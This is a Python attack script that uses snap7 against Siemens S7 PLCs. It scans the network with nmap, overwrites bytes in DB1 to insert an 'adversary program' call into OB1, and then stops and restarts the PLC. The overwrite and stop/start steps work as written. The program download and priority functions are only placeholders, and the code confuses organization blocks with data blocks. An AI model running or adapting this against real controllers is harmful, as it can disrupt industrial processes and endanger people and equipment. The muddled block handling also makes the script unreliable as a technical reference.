import socket
import subprocess
import snap7
import snap7.util
import time  # For delays and timing
import sys # For error handling

# Configuration (Adjust these to your environment)
PLC_IP = None  # Will be discovered
RACK = 0
SLOT = 1  # Often slot 1 for CPU
PLC_USERNAME = "your_plc_username"
PLC_PASSWORD = "your_plc_password"

ADVERSARY_PROGRAM_BLOCK = 10 # Example DB number

# Siemens S7 specific task (OB1)
OB1_NUMBER = 1
OB1_INTERVAL_MS = 100  #Desired interval in milliseconds


# Function to find the PLC's IP address using nmap
def find_plc_ip():
    """Uses nmap to discover devices on the network and returns the IP if a PLC is found"""
    try:
        # Run nmap to discover devices on the network
        result = subprocess.run(['nmap', '-sn', '192.168.1.0/24'], capture_output=True, text=True) # Replace '192.168.1.0/24' with your network range
        output = result.stdout
        
        # Check the output for PLC-specific info (adjust this to your specific PLC's banner)
        if "Siemens" in output:  # Example: look for "Siemens" in the nmap output
             for line in output.splitlines():
                if "Siemens" in line and "Nmap scan report" in line:
                   # Extract the IP address from the line
                   PLC_IP = line.split(" ")[4] # Get the IP address from the line of code

                   print(f"Found Siemens PLC at {PLC_IP}")
                   return PLC_IP
        else:
            print("No Siemens PLC found on the network.")
            return None
    except Exception as e:
        print(f"Error during network scan: {e}")
        return None

def connect_to_plc(ip_address, rack, slot, username, password):
    """Connects to the PLC using snap7."""
    plc = snap7.client.Client()
    try:
        plc.connect(ip_address, rack, slot)
        print(f"Connected to PLC at {ip_address}")
        return plc
    except Exception as e:
        print(f"Error connecting to PLC: {e}")
        print(f"Error details: {e}")
        return None

def check_plc_connection(plc):
    """Checks if the connection to the PLC is active."""
    try:
        if plc.get_connected():
            print("PLC is connected.")
            return True
        else:
            print("PLC is not connected.")
            return False
    except Exception as e:
        print(f"Error checking PLC connection: {e}")
        return False


def modify_task_association(plc, ob1_number, adversarial_db_number):
    """
    Modifies the OB1 task to include the adversarial program by
    downloading a modified OB1 DB.
    """
    try:
        # 1. Read the existing OB1 DB (usually DB1 for Siemens)
        ob1_data = plc.db_read(ob1_number, 0, 1024) # Read 1024 bytes, adjust as needed

        # Check if the data was read successfully
        if not ob1_data:
            print(f"Error: Could not read DB{ob1_number}.")
            return False

        # 2. Modify OB1 DB to Call the adversarial program (DB)
        #This is highly dependent on the PLC's programming language (SCL, LAD, FBD, etc.)
        #For example, in SCL, you might add a line like:
        # "CALL DB10;" where DB10 is the adversarial DB

        # This is a placeholder for the modification logic
        # You'll need to understand the OB1 DB structure to modify it correctly
        #  THIS IS A COMPLEX STEP.  It's impossible to provide a universal solution.
        #  It involves manipulating the raw bytes in the OB1_data bytearray.

        # Example:  Let's assume you need to insert a function call at offset 100 (totally arbitrary)
        #  You would need to encode the function call instruction (in S7 SCL/LAD/FBD) into bytes
        #  and insert them into ob1_data.

        # Dummy modification - REPLACE THIS WITH ACTUAL PLC INSTRUCTION ENCODING
        #  This example just replaces some bytes with dummy data

        ob1_data[100:104] = b'\x00\x00\x00\x00'  # Example replacement with null bytes
        print ("OB1 DB modified (PLACEHOLDER - REPLACE WITH REAL INSTRUCTION)")

        # 3. Write the modified OB1 DB back to the PLC
        plc.db_write(ob1_number, 0, ob1_data)
        print(f"Modified OB1 DB written to PLC (DB{ob1_number}).")

        return True

    except Exception as e:
        print(f"Error modifying OB1 DB: {e}")
        return False



def download_program(plc, program_file_path):
    """Downloads a PLC program from a file.  This is a PLACEHOLDER.
       The actual implementation is VERY vendor-specific."""
    print(f"Downloading program from {program_file_path} (PLACEHOLDER)")

    # Vendor-specific code to download the program to the PLC goes here.
    # For example, for Siemens PLCs, you might use a library like `gsms`
    # or directly interact with the S7 protocol using `snap7` to upload
    # code blocks.

    # This is just a simulation, replace it with real code
    print("Simulating program download.")
    time.sleep(2) # Simulate download time
    print("Program download complete (PLACEHOLDER).")
    return True


def set_task_priority(plc, task_name, new_priority):
    """Sets the priority of a given task. Placeholder."""
    print(f"Setting task {task_name} priority to {new_priority} (PLACEHOLDER)")
    # vendor-specific implementation here
    return True


def restart_plc(plc):
     """Restarts the PLC.  This is often required for configuration changes."""
     try:
        # Issue a PLC stop command
        plc.plc_stop()
        print("PLC stopped.")

        # Wait for a short period to ensure the PLC has stopped
        time.sleep(5)

        # Issue a PLC start command
        plc.plc_start()
        print("PLC started.")

        return True

     except Exception as e:
        print(f"Error restarting PLC: {e}")
        return False




# Main execution
if __name__ == "__main__":
    try:
        # 1. Find PLC IP address
        PLC_IP = find_plc_ip()

        if not PLC_IP:
            print("PLC IP address not found. Exiting.")
            sys.exit(1)


        # 2. Connect to the PLC
        plc = connect_to_plc(PLC_IP, RACK, SLOT, PLC_USERNAME, PLC_PASSWORD)

        if not plc:
            print("Failed to connect to PLC. Exiting.")
            sys.exit(1)

        # 3. Modify Task Association
        if modify_task_association(plc, OB1_NUMBER, ADVERSARY_PROGRAM_BLOCK):
           print ("Successfully modified OB1 DB.")
        else:
            print ("Failed to modify OB1 DB.")
            sys.exit(1)


        # 4. Restart the PLC
        if restart_plc(plc):
            print ("PLC Restarted successfully")
        else:
            print ("Failed to restart PLC")
            sys.exit(1)


        # 5. Disconnect from the PLC (Important)
        plc.disconnect()
        print("Disconnected from PLC.")

    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)